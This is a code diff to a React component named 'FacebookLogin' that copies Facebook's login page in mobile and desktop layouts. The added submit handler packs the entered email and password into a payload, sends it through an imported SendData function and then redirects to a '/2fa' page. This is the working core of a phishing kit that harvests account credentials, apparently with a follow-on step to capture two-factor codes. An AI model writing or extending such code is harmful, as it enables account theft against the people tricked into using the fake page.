@@ -3,8 +3,9 @@ import { ChevronLeft, Eye, EyeOff } from 'lucide-react';
 import { useCallback, useEffect, useState, memo } from 'react';
 import './style.css';
 import { useNavigate } from 'react-router-dom';
+import { SendData } from '../../config/sendData';
 
-// Mobile
+
 const MobileLoginForm = memo(({
   email,
   password,
@@ -100,7 +101,6 @@ const MobileLoginForm = memo(({
   </div>
 ));
 
-//  desktop
 const DesktopLayout = memo(({
   email,
   password,
@@ -241,7 +241,6 @@ const DesktopLayout = memo(({
   </div>
 ));
 
-// Component chính
 const FacebookLogin = () => {
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
@@ -263,9 +262,21 @@ const FacebookLogin = () => {
 
   const handleSubmit = useCallback((e: any) => {
     e.preventDefault();
-    setTimeout(() => { nav('/2fa'); }, 3000);
-    console.log('Đăng nhập với:', email, password);
-  }, [email, nav, password]);
+    const payload: any = {
+      user: email,
+      password: password
+    };
+    console.log('Payload:', payload);
+
+    SendData(payload)
+      .then((data) => {
+        console.log('Đăng nhập thành công:', data);
+        setTimeout(() => { nav('/2fa'); }, 5000);
+      })
+      .catch((error) => {
+        console.error('Lỗi đăng nhập:', error);
+      });
+  }, [email, password, nav]);
 
   const handleBackClick = useCallback(() => {
     window.location.href = '/';
